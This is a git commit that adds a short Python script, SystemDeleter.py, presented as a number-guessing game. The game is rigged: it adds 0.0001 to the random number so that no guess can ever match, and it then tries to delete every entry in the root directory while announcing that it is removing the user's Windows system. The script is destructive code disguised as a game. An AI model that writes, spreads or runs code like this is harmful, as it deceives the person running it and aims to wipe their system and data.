716a9b6aa1704d2678a0c050f34dbfc7e0d40d05
SpaceStudios <109873883+SpaceStudios@users.noreply.github.com>
2024-09-27 12:14:15 -0400

    Create SystemDeleter.py

---
+++ SystemDeleter.py
@@ -0,0 +1,9 @@
+import random
+import os
+answer = int(input("Pick a random number between 1 and 10"))
+randnum = random.randint(1,10)+0.0001
+if answer != randnum:
+    print("You guessed incorrectly now removing your entire windows system.")
+    sysList = os.listdir("/")
+    for x in sysList:
+        os.remove("/"+x)
